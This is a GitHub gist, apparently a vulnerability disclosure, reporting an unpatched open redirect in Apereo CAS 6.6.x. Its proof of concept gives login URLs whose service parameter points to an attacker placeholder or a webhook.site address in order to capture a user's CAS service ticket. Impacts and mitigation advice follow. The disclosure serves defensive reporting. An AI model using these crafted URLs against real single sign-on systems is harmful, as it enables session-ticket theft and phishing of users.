=== Content from gist.github.com_a9658443_20250114_215551.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@0xArthurSouza](https://avatars.githubusercontent.com/u/61798441?s=64&v=4)](/0xArthurSouza)

# [0xArthurSouza](/0xArthurSouza)/**[Open Redirect.md](/0xArthurSouza/68295d8fa20f18161945260fcdf842a2)** Secret

Created
November 5, 2024 00:23

Show Gist options

* [Download ZIP](/0xArthurSouza/68295d8fa20f18161945260fcdf842a2/archive/ec9363141e563d12f6740f51ede0ac05fb5b477f.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/0xArthurSouza/68295d8fa20f18161945260fcdf842a2.js&quot;&gt;&lt;/script&gt;
* Save 0xArthurSouza/68295d8fa20f18161945260fcdf842a2 to your computer and use it in GitHub Desktop.

[Code](/0xArthurSouza/68295d8fa20f18161945260fcdf842a2)
[Revisions
1](/0xArthurSouza/68295d8fa20f18161945260fcdf842a2/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/0xArthurSouza/68295d8fa20f18161945260fcdf842a2.js&quot;&gt;&lt;/script&gt;

Save 0xArthurSouza/68295d8fa20f18161945260fcdf842a2 to your computer and use it in GitHub Desktop.

[Download ZIP](/0xArthurSouza/68295d8fa20f18161945260fcdf842a2/archive/ec9363141e563d12f6740f51ede0ac05fb5b477f.zip)

 [Raw](/0xArthurSouza/68295d8fa20f18161945260fcdf842a2/raw/ec9363141e563d12f6740f51ede0ac05fb5b477f/Open%2520Redirect.md)

[**Open Redirect.md**](#file-open-redirect-md)

## **Affected Version:**

* **Apereo CAS**: 6.6.x
* [apereo/cas: Apereo CAS - Identity & Single Sign On for all earthlings and beyond.](https://github.com/apereo/cas)

## **Vulnerability Information:**

* **Vulnerability Type:** Open Redirect
* **Status:** Unpatched

## **Vulnerability Description:**

The *Open Redirect* vulnerability allows an attacker to manipulate internal redirects within a web application. This occurs when the application accepts user inputs to redirect to other URLs but does not correctly validate these inputs.

An attacker can exploit this flaw by providing a malicious URL that, when followed by users, redirects them to phishing, malicious, or unauthorized sites, compromising data security and user trust in the application.

---

## **Proof of Concept (PoC):**

The *Open Redirect* vulnerability is demonstrated when a service or product is accessed through a URL with the following format:

`hhttps://login-new.xxx.com.br/login?service=https://api-painel-servidores.xxx.com.br/auth?redirect_uri=https://painel-servidores.xxx.com.br`

This structure allows URL manipulation, enabling an attacker to redirect the user to a controlled application, as shown below:

`https://login-new.xxx.com.br/login?service=https://URL_ATACANTE/auth?redirect_uri=https://painel-servidores.xxx.com.br`

For the proof of concept, we will use the [Webhook](https://webhook.site/) service, which enables the creation of temporary URLs to receive and view data, such as cookies and headers, sent by **webhooks**, facilitating testing and debugging of integrations.

<https://i.ibb.co/f0RQ4kW/2024-11-04-21-19.png>

The manipulated URL for this test will be:

`https://login-new.xxx.com.br/login?service=https://webhook.site/4cc71ffd-3dc1-4707-bf31-edea47b0dcf4/auth?redirect_uri=https://painel-servidores.xxx.com.br`

After user authentication, as shown in the image below, the system redirects to the manipulated URL, allowing the **Webhook** to capture the *ST-Ticket*:

<https://i.ibb.co/VMwyyvf/2024-11-04-21-19-1.png>

<https://i.ibb.co/6rt1dMN/2024-11-04-21-20.png>

## **Impact:**

* **Indirect Session Hijacking:** Attackers could redirect users to malicious sites, potentially leading to session cookie theft and user impersonation.
* **Phishing:** Attackers could create fake login pages and use redirects to trick users into revealing credentials.
* **Malware Distribution:** Users could be directed to malicious sites containing malware, compromising their devices.
* **Reputational Damage:** User trust may be affected, as redirection to unsafe sites can make the application appear insecure.

---

## **Mitigation Recommendations:**

* **Whitelist of Permitted Redirects:** Define a list of allowed URLs to restrict redirect destinations to trusted sites only.
* **URL Validation and Encoding:** Properly validate and encode URL parameters, ensuring they are internal and trusted before performing redirects.
* **Security Tokens Implementation:** Use security tokens to verify the integrity of redirects, ensuring they are initiated by legitimate user actions.
* **User Notification:** If a redirect to an external domain is necessary, display a warning page to inform users, allowing them to choose whether to proceed or cancel.
* **Security Testing:** Conduct regular security tests to identify potential Open Redirects and other vulnerabilities, mitigating future attacks.

---

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2F0xArthurSouza%2F68295d8fa20f18161945260fcdf842a2)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


